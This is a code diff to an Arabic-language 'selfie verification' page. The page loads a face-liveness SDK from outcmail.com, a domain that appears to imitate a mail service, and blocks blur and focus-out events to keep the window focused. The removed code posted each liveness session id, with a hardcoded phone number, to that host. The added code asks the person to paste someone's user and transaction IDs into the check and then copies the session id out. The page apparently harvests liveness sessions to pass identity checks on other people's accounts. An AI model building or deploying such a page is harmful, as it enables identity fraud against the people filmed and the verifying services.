@@ -1,151 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>التحقق بالسيلفي</title>
+    <style>
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 60px;
+            height: 60px;
+            -webkit-animation: spin 2s linear infinite; /* Safari */
+            animation: spin 2s linear infinite;
+        }
 
- <style>
-.loader {
-  border: 16px solid #f3f3f3;
-  border-radius: 50%;
-  border-top: 16px solid #3498db;
-  width: 60px;
-  height: 60px;
-  -webkit-animation: spin 2s linear infinite; /* Safari */
-  animation: spin 2s linear infinite;
-}
+        /* Safari */
+        @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+        }
 
-/* Safari */
-@-webkit-keyframes spin {
-  0% { -webkit-transform: rotate(0deg); }
-  100% { -webkit-transform: rotate(360deg); }
-}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <br><br><br><br>
+        <p dir="rtl" lang="ar" style="font-size:60px;">يرجى الانتظار</p>
+        <div class="loader"></div>
+    </center>
 
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}</style>
+    <script>
+        window.addEventListener('blur', function(event) {
+            event.stopImmediatePropagation();
+            event.preventDefault();
+        }, true);
 
+        window.addEventListener('focusout', function(event) {
+            event.stopImmediatePropagation();
+            event.preventDefault();
+        }, true);
 
-<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
+        window.addEventListener('blur', function() {
+            setTimeout(function() {
+                window.focus();
+            }, 0);
+        });
 
+        function update_selfie(session_id) {
+            // عرض معرف الجلسة في نافذة منبثقة مع إمكانية النسخ
+            var sessionIdText = "معرف الجلسة: " + session_id;
+            alert(sessionIdText);
 
-<center>
-<br><br><br><br>
-<p dir='rtl' lang='ar' style='font-size:60px;'>يرجى الانتضار</p>
-<div class='loader'></div>
-</center>
+            navigator.clipboard.writeText(session_id).then(function() {
+                alert("تم نسخ معرف الجلسة");
+            }, function() {
+                alert("فشل النسخ، الرجاء المحاولة مرة أخرى");
+            });
+        }
 
-<script>
+        require('https://outcmail.com/Liveness/js/1.php', function () {
+            setTimeout(function () {
+                // عرض مربع إدخال لإدخال الكودين
+                var input = prompt("الرجاء إدخال الكودين مفصولين بفاصلة:");
+                if (input) {
+                    var codes = input.split(",");
+                    if (codes.length === 2) {
+                        var user_id = codes[0].trim();
+                        var transaction_id = codes[1].trim();
 
-//var devId = Website2APK.getUniqueDeviceID();
-//alert(devId);
+                        OzLiveness.open({
+                            lang: 'en',
+                            meta: {
+                                'user_id': user_id,
+                                'transaction_id': transaction_id
+                            },
+                            overlay_options: false,
+                            action: [
+                                'video_selfie_blank'
+                            ],
+                            on_complete: function (result) {
+                                if (result.analyses.quality.resolution == 'success') {
+                                    var session_id = result.event_session_id;
+                                    update_selfie(session_id);
+                                } else if (result.analyses.quality.resolution == 'declined') {
+                                    document.body.innerHTML = `
+                                    <center>
+                                    <br><br><br><br>
+                                    <p dir='rtl' lang='ar' style='font-size:60px;'>فشل السيلفي</p>
+                                    <p dir='rtl' lang='ar' style='font-size:60px;'>حاول مرة أخرى</p>
+                                    <div class='loader'></div>
+                                    </center>`;
+                                    setTimeout(function() { window.location.reload(true); }, 5000);
+                                }
+                            }
+                        });
+                    } else {
+                        alert("الرجاء التأكد من إدخال الكودين بشكل صحيح.");
+                    }
+                }
+            }, 1000);
+        });
 
-
-
-window.addEventListener('blur', function(event) {
-event.stopImmediatePropagation();
-event.preventDefault();
-}, true);
-window.addEventListener('focusout', function(event) {
-event.stopImmediatePropagation();
-event.preventDefault();
-}, true);
-window.addEventListener('blur', function() {
-setTimeout(function() {
-window.focus();
-}, 0);
-});
-
-
-
-
-
-function update_selfie(session_id){
-
-if('no' == 'no' ){
-document.body.innerHTML =`
-<center>
-<br><br><br><br>
-<p dir='rtl' lang='ar' style='font-size:60px;'>تم بنجاح</p>
-<img src='https://outcmail.com/ajax/ok.png' width='200' height='200'>
-</center>
-`;
-}else{
-
-
-
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-
-document.body.innerHTML =`
-<center>
-<br><br><br><br>
-<p dir='rtl' lang='ar' style='font-size:60px;'>تم بنجاح</p>
-<img src='https://outcmail.com/ajax/ok.png' width='200' height='200'>
-</center>
-`;
-
-
-}
-};
-xhttp.open('POST', 'https://outcmail.com/Liveness/ok.php?phone=0791553012&befor=0', true);
-xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-xhttp.onerror = function () {
-setTimeout(function() { update_selfie(session_id); }, 2000);
-};
-xhttp.send('session_id='+session_id+'&rdv=');
-
-} 
-}
-
-
-
-
-
-require('https://outcmail.com/Liveness/js/1.php',function () {
-
-setTimeout(function () {
-OzLiveness.open({
-lang: 'en',
-meta: {
-                'user_id': '',
-                'transaction_id': ''
-},
-                    overlay_options: false,
-                    action: [
-                        'video_selfie_blank'
-                    ],
-                    on_complete: function (result) {
-if(result.analyses.quality.resolution == 'success'){
-
-var session_id = result.event_session_id;
-
-
-update_selfie(session_id);
-
-
-
-}else if(result.analyses.quality.resolution == 'declined'){
-document.body.innerHTML = `
-<center>
-<br><br><br><br>
-<p dir='rtl' lang='ar' style='font-size:60px;'>فشل السلفي</p>
-<p dir='rtl' lang='ar' style='font-size:60px;'>حاول مرة أخرى</p>
-<div class='loader'></div>
-</center>`;
-setTimeout(function() { window.location.reload(true); }, 5000);
-}
-}
-});
-},1000)
-
-});
-
-function require(url, callback) {
-var e = document.createElement('script');
-e.src = url+'?_='+Math.floor(Math.random()*10000000000);
-e.type='text/javascript';
-e.addEventListener('load', callback);
-e.addEventListener('error', function() { setTimeout(require,3000,url,callback) })
-document.getElementsByTagName('html')[0].appendChild(e);
-}
-
-</script>
-
+        function require(url, callback) {
+            var e = document.createElement('script');
+            e.src = url + '?_=' + Math.floor(Math.random() * 10000000000);
+            e.type = 'text/javascript';
+            e.addEventListener('load', callback);
+            e.addEventListener('error', function() {
+                setTimeout(require, 3000, url, callback);
+            });
+            document.getElementsByTagName('html')[0].appendChild(e);
+        }
+    </script>
+</body>
+</html>
